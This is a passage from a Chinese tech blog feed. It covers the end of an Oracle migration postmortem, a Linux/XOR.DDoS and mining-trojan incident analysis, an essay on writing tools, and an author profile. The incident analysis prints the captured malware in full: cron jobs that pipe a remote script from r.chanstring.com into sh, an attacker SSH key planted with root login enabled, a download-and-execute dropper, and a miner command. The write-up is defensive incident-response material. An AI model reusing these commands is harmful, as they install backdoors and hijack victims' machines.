万事留后路割接失败是需要承担很大压力的。这次割接是大家都期待很久的，为了几分钟的操作，用户和我们整个团队都付出了很大的努力，调动了方方面面的资源参与进来。 如果说有什么能稍感欣慰的话，那就是我们遍历了各种可能，几乎成功，在不可知的情况出现之后，还能赶在割接窗口结束之前，快速回退。这主要得益于前期准备方案时，特别考虑了最坏的情况，认真演练了回退流程。 这种体验与技术关系不大，来自于勇气——无论是正确的，还是错误的决定。 幽灵进程事后筛查发现，导致割接失败的是一个监测程序——不在生产程序清单里面，没有读统一配置，自带定时调度，零散分布在一半的机器上，早已经被人遗忘。在旧库中，这个问题其实一直存在，但是不会有什么问题。 新数据库的版本是Oracle 11g 。为了提高安全性，防止暴力破解数据库中用户的密码，Oracle默认提供了一种机制：延长失败尝试响应。这种策略是：在连续使用错误密码反复尝试登录时，从第四次错误尝试开始，每次增加1秒的延迟，最长延迟目前是10秒。使用这种手段可以相对比较有效的防治用户密码的暴力破解。 由于系统服务器较多，历史遗留程序瞬间就触发该机制，导致所有应用不可用。 五、总结虽然这次的迁移不甚完美，事情本身也谈不上宏大，简短的一篇更不可能穷举所有的问题和细节，但是有几点思考还是想和大家交流： 5.1 变通 回想起来，开始设计方案时想到的几个大难题，都是通过替代方案实现的：奇葩的内外网分离方案，与IT部门关于权限问题的艰难谈判，数据复制过程中及时性的要求…… 另外，还有真实割接过程中，现场压力状态的进退困境。到处都需要权衡、选择。 决策是一件非常艰难的事情，受到多种因素的制约，最终的决策是一个各种利益妥协的结果。正如另一位资深哲人所说： 项目经理首先要学会变通。 天下武功，无坚不摧，唯变不破。 5.2 韧性 按照最初的方案，我其实并不负责这项工作，后来就算参与进来，也并不负责主导。应该说起初也有侥幸心理，希望有其他人来背这个锅。为了这次迁移，前面已经生生吓走了好几拨人。 从技术上分析，我以前没怎么搞过数据库，并不具备任何优势。 如果说还有一点可以凭借的东西，我感觉是韧性。面对未知的恐惧，敢于直面；面对不确定的方案，不断在尝试；面对失败的后果，坦然接受。 邱俊涛：如何持久化你的项目经历&gt;从项目上下来之后，需要深入思考并总结之前的经验，这种深入思考会帮助你建立比较完整的知识体系，也可以让你在下一项目中更加得心应手，举一反三。如果只是蜻蜓点水般的“经历”了若干个项目，而不进行深入的总结和思考，相当于把相同的项目用不同的技术栈做了很多遍一样，那和我们平时所痛恨的重复代码又有什么不同呢？ 参考文献 密码延迟验证导致的系统HANG住 | yangtingkun 【翻译】为什么我的数据库变得这么慢？ | Cholerae’s Blog 关于Oracle Sharding | Oracle FAQ文档翻译| eygle.com 防范攻击 加强管控 - Oracle数据库安全的16条军规 | eygle.com How to Analyse Row Lock Contention in Oracle 10gR2 and later | kamus iptables高性能前端优化-无压力配置1w+条规则,2017| Bomb250 Oracle 数据库健康检查平台]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[木马来袭:Linux/XOR.DDoS样本分析]]></title>
    <url>%2F2016%2F06%2F12%2FCyberSecurity-Trojan%2F</url>
    <content type="text"><![CDATA[摘要 Linux/XOR.DDoS 木马入侵分析 在与特洛伊的战争中，我们从未取得优势。— 弗拉基米.耶维奇.严 Linux/XOR.DDoS 木马入侵分析 第一节：编号101 第二节：今天你被挖矿了吗？ 工程师的三大法宝一个有江湖经验的工程师，通常随身携带三件法宝，就像这样： 用户：这个采集点为什么没数据？客服：我们看看工程师各种排查，重启进程客服：现在有了，你再看看？用户：……三天后用户：这个采集点为什么又没数据？工程师各种排查，发现A机房的某台服务器登陆缓慢客服：一台服务器坏了，需要重装系统用户：……系统重装几周后，问题再次来袭工程师：服务器太老了，硬件有问题，建议换新的用户：…… “没有什么问题是重启解决不了的，如果一次不行，那就两次。” 在很多情况下，三板斧确实可以解决不少问题。 重启：包括进程重启和系统重启，鉴于很多程序自身的隐藏性能问题，重启可以释放资源、重新加载配置，或者可能输出异常信息，为解决问题提供思路。重装：修复被破坏的文件，格式化磁盘，修复配置等。有一定效果。换机器：对于有年头的机器有效，磁盘、CPU、主板、乃至于不起眼的一颗电池，都有可能是引发性能问题的瓶颈。 如果排除上述因素，就要警惕自己的机器是不是被植入木马了。我们首先来看一个样本。 特征分析一般特征：功能异常数上升、登陆缓慢、网卡流量异常波动如果木马程序还没有进程隐藏功能的话，还可以在top看到如下信息 12PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND3494 root 19 0 378m 25m 212 R **1595.6** 0.7 5798:34 eyshcjdmzg 这是我抓到的第一个木马样本，所以给它取了个代号：101。 基础分析 篡改crontab 123456789101112# cat /etc/crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/\# run-parts01 * * * * root run-parts /etc/cron.hourly02 4 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly\*/3 * * * * root /etc/cron.hourly/gcc.sh 程序入口 123456# vi /etc/cron.hourly/gcc.sh\#!/bin/shPATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/binfor i in `cat /proc/net/dev|grep :|awk -F: &#123;&apos;print $1&apos;&#125;`; do ifconfig $i up&amp; done cp /lib/libudev.so /lib/libudev.so.6/lib/libudev.so.6 木马通过crontab创建时间计划任务来实现启动,运行该gcc.sh，该命令启动所有网卡，并拷贝/lib/libudev.so文件到/lib/libudev.so.6并执行该文件。 攻击路径如果部署了登陆审计平台，或者对方还没来得及清扫犯罪现场，可以看到他的来路：12-bash-4.3# last -10user pts/3 11X.25.49.200 Mon Jun 6 23:46 - 01:47 (02:01) 再根据以上公网IP和时间，可以定位到它的来源是某普通宽带用户。宽带账号：05919399XXXX@fj客户名称：危XX 应急清除策略恢复crontab－&gt;清除gcc.sh －&gt;清除/lib/libudev.so.6 －&gt;查杀进程一定要注意操作顺序，如果只kill掉进程是没有用的，它已经做到自己复制、重启。 XOR.DDoS木马原理编号101是一款国产的Linux系统的远程控制软件（Linux/XOR.DDoS）。 MalwareMustDie首先在2014年10月曝光了该木马。32位和64位的Linux Web服务器、台式机、ARM架构系统等也容易遭受该木马攻击。 杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。 此外，它主要针对游戏和教育网站，能够对其发起强有力的DDoS攻击，可以达到每秒1500亿字节的恶意流量。根据内容分发网络Akamai科技发布的一份报告，XOR DDoS僵尸网络每天至少瞄准20个网站，将近90%的目标站点位于亚洲。报告中声称：“Akamai的安全情报反应小组（SIRT）正在追踪XOR DDoS，这是一个木马恶意软件，攻击者使用它劫持Linux机器并将其加入到僵尸网络，以发起分布式拒绝服务攻击（DDoS）活动。迄今为止，XOR DDoS僵尸网络的DDoS攻击带宽从数十亿字节每秒（Gbps）到150+Gbps。游戏行业是其主要的攻击目标，然后是教育机构。今天早上Akamai SIRT发布了一份安全威胁报告，该报告由安全响应工程师Tsvetelin ‘Vincent’ Choranov所作。” 源码分析多态（Polymorphic） 是指恶意软件在自我繁殖期间不断改变（“morphs”）其自身文件特征码（大小、hash等等）的特点，衍生后的恶意软件可能跟以前副本不一致。因此，这种能够自我变种的恶意软件很难使用基于签名扫描的安全软件进行识别和检测。 木马具有非常多功能：增加服务、删除服务、执行程序、隐藏进程、隐藏文件、下载文件、获取系统信息、发起DDOS攻击等行为。主程序的作用是根据感染目标机器的系统开发版本传输并且选择C&amp;C服务器。C2服务器归属地为美国,加利福尼亚州,洛杉矶。 其实就算是拿到了样本，逆向难度也很大。何况木马关键数据全部加密，传输过程也加密，哪哪都是加密。笔者曾经试图自行破解，找来了《IDA Pro指南》之类的秘籍，无奈功力不够，只能草草收场。 防御之难首先，防御一方是守城战。资源有限，防线漫长，安全投入大见效慢。做与不做效果无法评估，做了不代表没有漏洞，不做也不见得出什么大事。 其次，消极安全观主导制度体系建设。每个大单位都有安全责任制，甚至很多地方都上升到安全KPI一票否决的高度。实际情况呢？ 管理上的松散、各自为战，为了安全KPI，消极看待业务需求，逼得业务方剑走偏锋，反而增加了漏洞风险。 最后，攻防双方技术上完全不对等。攻击者已经进化到大兵团作战模式，兵强马壮，甚至还发展出CaaS（Crime as a Service）这类梦幻般的服务理念。例如僵尸网络不仅可以调度全部资源，提供大规模攻击服务，还能提供间歇性的慢速攻击服务。按需收费，童叟无欺。防御者基本上还是的大刀长矛。这战没发打。 合作如果凭借笔者个人的天资和努力，甚至凭借本公司的力量，几乎可以肯定，我们到现在还不一定能知道这款的木马的名字，更不用说管窥它的细节。因为我们根本就不是安全公司，几百号人里面连一个安全专家都没有。这种情况在其它企业应该也具有普遍性。 在这次的案例中，很快就完成了从样本捕获、攻击分析到安全加固的一系列动作，全程业务不受太大影响，甲方用户基本无感知。关键得益于和第三方的充分合作。 微步在线（ThreatBook）——国内首家威胁情报公司。它们的思路很特别，没有去走传统安全公司的老路，而是专注于威胁情报的样本分析、收集和处理，实现大范围长跨度的数据积累，促进情报交流和信息共享，通过合作创造价值。这个思路对于打破行业、竞争企业的壁垒，意义非凡。 最近，它们刚刚拿到A轮投资，资本市场就是敏锐。 今天你被挖矿了吗？书接上文，针对编号101样本的分析，我们已经知道，黑色产业界通过植入木马，控制了大量主机资源，只要有人花钱，就可以按需要调度足够的资源发动DDos攻击，据说还可以按效果付费。此外，还有一种常见模式则是“挖矿木马”，首先还是来看样本：123456root 3744 29921 0 19:53 pts/0 00:00:00 grep minroot 31333 1 99 19:48 ? 02:46:38/opt/minerd -B -a cryptonight-o stratum+tcp://xmr.crypto-pool.fr:8080 -u48vKMSzWMF8TCVvMJ6jV1BfKZJFwNXRntazXquc7fvq9DW23GKkcvQMinrKeQ1vuxD4RTmiYmCwY4inWmvCXWbcJHL3JDwp -p x uptime看到的负载值非常高。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465## 启动脚本echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" &gt; /var/spool/cron/crontabs/rootif [ ! -f "/root/.ssh/KHK75NEOiq" ]; then mkdir -p ~/.ssh rm -f ~/.ssh/authorized_keys* echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" &gt; ~/.ssh/KHK75NEOiq echo "PermitRootLogin yes" &gt;&gt; /etc/ssh/sshd_config echo "RSAAuthentication yes" &gt;&gt; /etc/ssh/sshd_config echo "PubkeyAuthentication yes" &gt;&gt; /etc/ssh/sshd_config echo "AuthorizedKeysFile .ssh/KHK75NEOiq" &gt;&gt; /etc/ssh/sshd_config /etc/init.d/sshd restartfiif [ ! -f "/etc/init.d/lady" ]; then if [ ! -f "/etc/systemd/system/lady.service" ]; then mkdir -p /opt curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33 fifiservice lady startsystemctl start lady.service/etc/init.d/lady startecho "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" &gt; /var/spool/cron/crontabs/rootif [ ! -f "/root/.ssh/KHK75NEOiq" ]; then mkdir -p ~/.ssh rm -f ~/.ssh/authorized_keys* echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" &gt; ~/.ssh/KHK75NEOiq echo "PermitRootLogin yes" &gt;&gt; /etc/ssh/sshd_config echo "RSAAuthentication yes" &gt;&gt; /etc/ssh/sshd_config echo "PubkeyAuthentication yes" &gt;&gt; /etc/ssh/sshd_config echo "AuthorizedKeysFile .ssh/KHK75NEOiq" &gt;&gt; /etc/ssh/sshd_config /etc/init.d/sshd restartfiif [ ! -f "/etc/init.d/lady" ]; then if [ ! -f "/etc/systemd/system/lady.service" ]; then mkdir -p /opt curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33 fifiservice lady startsystemctl start lady.service/etc/init.d/lady startmkdir -p /opt# /etc/init.d/lady stop# systemctl stop lady.service# pkill /opt/cron# pkill /usr/bin/cron# rm -rf /etc/init.d/lady# rm -rf /etc/systemd/system/lady.service# rm -rf /opt/KHK75NEOiq33# rm -rf /usr/bin/cron# rm -rf /usr/bin/.cron.old# rm -rf /usr/bin/.cron.new 商业模式被植入比特币“挖矿木马”的电脑，系统性能会受到较大影响，电脑操作会明显卡慢、散热风扇狂转；另一个危害在于，“挖矿木马”会大量耗电，并造成显卡、ＣＰＵ等硬件急剧损耗。比特币具有匿名属性，其交易过程是不可逆的，被盗后根本无法查询是被谁盗取，流向哪里，因此也成为黑客的重点窃取对象。 攻击&amp;防御植入方式：安全防护策略薄弱，利用Jenkins、Redis等中间件的漏洞发起攻击，获得root权限。 最好的防御可能还是做好防护策略、严密监控服务器资源消耗（CPU／load）。 这种木马很容易变种，很多情况杀毒软件未必能够识别：63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 黑暗幽灵（DCM）木马详细分析 深入剖析某国外组织针对中国境内企业的APT攻击(CVE-2015-8651) | 2016-01-18 微步在线 安全威胁情报 隐秘通讯与跳板？C&amp;C服务器究竟是怎么一回事 | 2016-09-23 ArthurKiller FreeBuf 逆向工厂（二）：静态分析技术 | 2016-09-28 追影人 FreeBuf]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最佳写作实践：从Evernote到Ulysses]]></title>
    <url>%2F2016%2F06%2F11%2FWriting%2F</url>
    <content type="text"><![CDATA[摘要 一、写作的定义 二、我的困惑 三、缘起：《顾准日记》 四、写作素材 写作工具箱 180天个人业余写作总结：从缘起、驱动力、工具链、成果影响等角度展开，全方位实录这段过程实践，发表出来对自己是一种鞭策，也希望能够为需要的朋友提供一些思考和帮助。 写作可以成为你的一个伴侣，能在你的周围筑起一个看不见摸不着的水晶空间，你就像鱼缸里的一条金鱼，不过这个鱼缸是金鱼自己造出来的。写作一直陪伴着我，旅途中也没有片刻停下来，所以我从未感到无所事事。不是玻璃需要磨光，就是结构需要调整，要不就是缸体需要加固。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p227） 一、写作的定义笔者是一个普通人，跑来谈写作，还是最佳实践，似乎有点标题党的嫌疑，毕竟我既没有专业作家的身份，也不够网红的最低门槛。首先，让我们来看看写作（Writing）的一般定义： Writing is a medium of human communication that represents language and emotion through the inscription or recording of signs and symbols. (From Wikipedia) 因此，写作本质上并不是某些职业的专属技能，而是人类出于交流目的的普遍需求。理解这几个概念之后，后面的话题就好展开了。 二、我的困惑对于很多朋友、特别是已经有过一定实际工作经验的人来说，或许很多都有下面类似的问题，我总结为三大症状： “专业”有余，能力弱化，视野日小 计划愈多，碎片愈多，效率愈低 地狱修行，独行无友，沉于安逸 一般而言，离开学校之后，人群个体开始接受社会化的训练引导，经年之后，大多数人会完成塑造定型，成为分工体系里新的螺丝钉或者齿轮。日子叠着日子，工作夹杂着琐碎，也许积累了不少“专业”知识，但是不知不觉中，有一项最重要的技能却逐渐弱化了——接受新事物的心态、系统掌握新知识、新技能的学习能力。 在多如牛毛的抗战片里面，我认为唯一可看、且达到思想高度的是《我的团长我的团》，剧中死啦死啦的《论安逸》堪称经典：“死都不怕，就怕不安逸，命都不要，就要安逸，就这毛病。多少年来这是个被人钉死了的死穴，一打一个准儿……”。 打个不恰当的比方吧，在学校里读书就像待在正面战场，颇有金戈铁马、喊声震天的味道，或者人人都还在假装有那个味道；在工作以后读书、在过日子中读书，那就不一样了，人民群众喜闻乐见的还得是安逸。升官发财、结婚生子方是热点，读书求道、探索未知却很难找到位置——我们民族的内心深处，和福禄寿走得比较近，距受难先知比较远。 三、缘起：《顾准日记》由于工作的关系，过去一整年的时间里发生了一些变化，对于过去的经历、思想和行为做了比较深入的梳理和反思。基于某些因缘——我很喜欢这个词，“前缘相生，因也；现相助成，缘也”，一切有所得，皆是时机成熟而已。 首要因缘就是是读了《顾准历史文集》和《顾准日记》。 我们想象一下：退回到现代迷信充斥在上世纪70年代的中国，有这样一个“形单影只、独处斗室，以啃冷馒头、钻图书馆度日以至于死”（李慎之语）的知识分子，顶住了政治的、思想的、生存的、体质的重压，不时发出了独立而超前之想。 那是一个会把人席卷而去的时代，他怎么能在风暴中趴在地上紧紧扣住这两颗石子，而不被吹走，甚至连气息都不沾染?顾准后来说过，这一年的生活让他养成‘读史’的习惯。这种习惯的好处就是“样样东西都要自己学着去判断”。(柴静) 关于顾准其人、其事和评价争议，我不想在这里过多展开，唯一需要说明的是：相较于强制劳动和物质匮乏，灌输型的思想管制，才是劳改营的精髓所在。能在长久的牢狱中活下来、不丢失自由本性、甚至能有所成就，学习、思考是唯一的救赎之路，也是最难坚守的“反动”品质。 习惯一旦生成，就会自动带着人去往未知之地。 情怀就是这些，下面介绍一些写作实践过程中的技术细节： 四、写作素材Known Knowns：知识体系重构在开始写东西之前，第一件事情应该是深度梳理自己的知识结构，大而言之，无非是以下三类： Known Knowns:已知的已知 Known UnKnowns:已知的未知 Unknown Unknowns:未知的未知 第一类：通常是就读的专业、长期从事的工作。我们在这些领域往往已经有了较长时间的投入、系统的知识框架和一定的实务经验，是最有可能提供优质输出内容的方向。第二类：主要体现在广度和深度。这部分内容通常是专业内需要涉猎、深入学习的东西，个人能力可以判断自己是否掌握，只要加以努力，都可以有所收获的领域。第三类：更高的境界、超出现有知识体系范围，如果要获得这类知识，一般需要非线性、跨越式的学习经历。示例： 素材一：无笔记不读书在这个《21天精通XX编程》、《图解资治通鉴》、《一本书看透金融》充斥眼帘的时代，还有人深度阅读吗？在这个大师遍地、专家变砖、天天都在喊颠覆的时代，又该把有限的学习精力投资在哪里呢？ 微博上一位牛人曾有高论：“成千上万种媒体与论坛，同质化的,重复的,口号式的,改头換面的,无病呻吟的內容和语言太多太多了，充其量有與论意义而无学术意义”。“如果能选一二本读透读通，读到能基本复述，远比读十本甚至几十本”快餐书”有用、省时间，有一揽众山小之感。” 诚如斯言。少林武功七十二绝技，天下各派兵器、套路更是成千上万，就算是天才，终其一生练其十分之一都不可能。这“一二本”需要读透读通的书，应该就是基本功之外，入门弟子都渴望掌握的上乘功夫、心法口诀，登堂入室之不二法门。 从这个角度出发，我最先尝试的是写读书笔记。 例如最近一年看的《万历十五年》、《伍连德》、《李自成》和《尘埃落定》等传记、小说，如果按照以前的习惯，可能也就是随便翻一翻，但是基于读书笔记的任务导向，主要还是公开发表的鞭策——就不得不反复阅读几遍，以期准确把握作者的意图。 针对另一些大部头的专著，一般会略超出接受能力。我尝试过在线公布进度的方法。也是一个好办法。例如，《性能之颠》： 第一阶段：201601。 分享：《系统专家系列：性能之巅1》 框架结构、未深入第二阶段：201603。关联阅读《24小时365天不间断服务》。 分享《系统专家之路－推荐书单》 分享《基于Linux单机的负载评估》第三阶段：201604-05。 完成第一次通读。掌握体系结构、主要概念。 关联阅读Brendan Gregg’s Blog &amp; Github 。（深度精品） 分享：《Netflix性能分析模型：In 60 Seconds》第四阶段：20160512～计划：深入掌握DTrace、火焰图 在初始的1-2个月时间内，由于先前知识储备的不足，一度出现停滞。后面通过持续的扩展阅读和交流，一扫前期的混沌矇昧状态，宛如打开了一扇通往新世界的窗户。 素材二：让翻译成为一种习惯坦白说，我的英文水平以前并不好，现在也好不到哪里去。今年我养成了业余翻译的习惯，这首先要感谢《Economist》。 在全球报业大萧条的背景下，《Economist》依然能够逆势增长，得益于其独特风格：简约不失观点、视野宽广不失深度、幽默而发人思考、丰富的数据表现力等等。特别是在信息爆炸，甚至信息过载的时代，注意力是最宝贵的资源 , 谁能提供最优质的有效信息，谁就是最有价值的人。经济学人显然做到了。 我还是阅读并翻译一段时间的《Economist》之后才知道，本国相当数量的本科生也在翻译它——他们只是当考研练习题做，真是可惜。回想过去，应该会有不少人和我一样的体会，本朝的英语考试真的非常恶心：卷面上蚂蚁一样小的字、机械的排版、多如牛毛永远也做不完的阅读理解习题、变态的选项设置……几乎要把人的兴趣消磨殆尽，更谈不上什么阅读乐趣。 《Economist》优质的文章，吸引我持续阅读，碰到精妙之处更不禁击节赞叹，甚于把好文章翻译出来和更多人分享，也就成了水到渠成的事。从我熟悉的中国版开始，再到国际关系版块，再到其它感兴趣的文章，甚至于进一步扩展到职业相关领域的内容。通过阅读而翻译，为了更好的翻译就得阅读更多内容，一个良性的反馈环路就此形成。 五、写作工具箱不能否认，总是有很多不世出的神人，完全可以用纯文本写出煌煌巨著、打磨出神兵利器。但是我等凡人，还是需要一些工具的辅助。我的工具箱不是在一开始就形成的——现在也还处于演化过程中，工具链的选择过程，尝试－比较－抛弃的选择过程，本身就是一个不断迭代重构的过程。 工欲善其事，必先利其器 Evernote：素材仓库支持所有手机、平板和电脑。在任意一台设备打开Evernote，随时记录一切、轻松收集资料、一键演示笔记、高效协作共享。 MindManager：框架梳理一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，MindManager可以辅助进行思维整理、分析、可视化的工具。比如写这篇的时候，就是现在MindManager梳理了一个概要，之后导出为文本作为底稿： OmniGraffle：思维可视化由The Omni Group制作的一款绘图软件，它曾获得苹果设计奖。可以支持流程图、逻辑图、模型设计等，堪称万能绘图神器。这年头大家都挺忙的，能用一张图表达的意图，就不用写一大堆字啦。 Markdown：一次编写，到处发表Markdown标记语言，我其实很久以前就掌握了，但是使用频率很低，也谈不上什么美感。真正推动我把Markdown纳入个人工具箱的也是写作，可以说是相辅相成吧。它最大的意义在于通过极简的形式，解决了写作成果的移植通用性的问题。 Ulysses：美轮美奂 版权骑士：打击盗版，人人有责。 “维权骑士”有一套自己的监测系统。签约作者用发表的文章，都会纳入“维权骑士”的监测系统，并与各公众号、网站发布内容进行“比对”。一旦发现抄袭，将负责代表作者维护版权。 阅读用户分析 六、经验谈为了保证持续输出，就需要进行大量扩展活动，甚至通过大量绘图的方式整理思路。例如读完黄仁宇的明史系列文集之后，还专门留意了明朝摩崖石刻遗址、戚继光纪念祠故地，进行现场观察、拍照。 搭建个人网站，将已知、未知、感兴趣的领域划分出来，再把思维碎片、已经发布的作品填充进去，再编辑再梳理，就可以强有力地推动个人知识体系的结构性重构。 内容为王作品发布之后，可以借助分析工具查看阅读量、用户分布等信息。先来看一组数字：180天，累计超10万字，订阅用户数200＋，初步形成微生态圈。 分析这些数字背后的来源，实际上又最集中在以下三篇： 《最佳工程实践－思维利器OmniGraffle》分析：工具指南类型，但是我没有局限于功能性－因为这类一般已经比较多了，不大可能比别人写得更详细、更好，而是从方法论的角度提供建议，获得不少产品经理的青睐。 《新一代Ntopng网络流量监控—可视化和架构分析》分析：相对前沿、内容新，标题党，持续获得专业用户关注。 《Stack Overflow 架构分析》（译）分析：行业大号推荐：单日阅读5000+，对于行业细分领域来说还算不错。甚至在外界传播之后，反向影响到公司内部。 我的这些东西，在一般熟人圈子发，远远没有搞怪照片或抖机灵的段子来的点赞多。如果没有公众发表渠道，我甚至都坚持不下去。 正如《Economist》的成功不在普通的文字编辑，而在于强大的研究智库一样，越是信息爆炸的时代，越是需要高品质的内容输出者。 附录：180天部分写作成果 Economist 译文 《欧洲难民危机》 《沙特王国改革蓝图》 《当代德国纳粹魅影》 读书笔记系列：《万历十五年》、《国士无双伍连德》、《李自成》 外军研究系列：《美军体能训练观察》、《美军士官制度观察》 工具系列： 《最佳工程实践－思维利器OmniGraffle》 《跑步应用Nike+ Running与Garmin Mobile评测》 技术架构系列： 《网络设备OpenSSH7.0兼容性测试报告》 《ZeroMQ 社区生态白皮书》 《新一代Ntopng网络流量监控—可视化和架构分析》 《最佳工程实践－基于Redmine的项目管理平台》 《Stack Overflow 架构分析》（译） 《基于Linux单机的负载评估》 《Netflix性能分析模型：In 60 Seconds》（译） 《TED Talk: the mind behind the Linux》（译） Next 组织一个业余翻译社 在实践翻译的过程中发现，个体的力量的多么薄弱。积聚用户需要持续输出，业余写作最大的困难又在于时间投入的不可预期上。如果能借鉴开源的一些形式和技术，是否能够将个人活动提升到团队级别呢？ 或者我应该先去为此搞一笔基金？ 写一个专题文集 主要是为了训练定力，提高专业深度。每集至少包含10篇。 review:GitBook《Linux Perf Master》(201701,完成) 扩展阅读 最佳写作实践：从Evernote到Ulysses 技术团队中的作家 我的写作工具链 Kanban 看板管理实践精要 数据可视化（一）思维利器 OmniGraffle 绘图指南 参考文献 用了 3 年 Ulysses 后，为什么我转而选择 iA Writer 作为主力写作工具？ | 2019-10]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>eBook</tag>
        <tag>工具癖</tag>
        <tag>Mac</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[About]]></title>
    <url>%2F2016%2F05%2F31%2FAboutMe%2F</url>
    <content type="text"><![CDATA[Contact Home Site : https://riboseyim.github.io Tech Blog : https://riboseyim.com Email : riboseyim@gmail.com. Linkedin Profile CommunityFollow me on Twitter at @RiboseYim Telegram channel: https://t.me/riboseyim 知识星球「睿哥读书会」 年表 Year of 2019:年度盘点 Year of 2018:年度盘点 Year of 2017:年度盘点 Year of 2016:年度盘点 Year of 2012:年度盘点 Technology &amp; SkillsBASIC Communicate Writing Report Project Team Leadership Network Planning Engineering Prototype analysis 发明专利网络设备安全认证服务可靠性增强方法、系统（第一发明人）终端接入办公网络安全管控方法及认证服务器（第一发明人）201811427043.2 网络故障诊断方法和系统（第一发明人）本发明提供一种网络故障诊断方法、系统，采用网络历史数据中的症状数据集以及故障数据集对梯度提升树分类器预测模型进行训练，然后利用训练后的梯度提升树分类器预测模型进行网络故障诊断，能够有效提高网络故障诊断精度，并能够有效缩短网路故障诊断时间，适应多样化生产场景。 201711294715.2 网络设备安全管理系统、方法及计算机可读存储介质（第一发明人）本发明实施例提供了一种网络设备安全管理系统、方法及计算机可读存储介质，其中，该系统包括:管理控制机，用于接收分别为每个用户账号和每个网络设备设置的管理策略，并将管理策略实时发送给认证机;所述认证机，用于接收网络设备发送的通过用户账号发起的认证请求和操作授权请求，根据所述网络设备的管理策略和所述用户账号的管理策略分别响应所述认证请求和所述操作授权请求，实现对所述网络设备的安全管理。 其它 201911233006.2 机房市电停电监测方法及装置]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PM指南:源代码版本管理|工具与技术]]></title>
    <url>%2F2016%2F05%2F31%2FTeamWork-Git%2F</url>
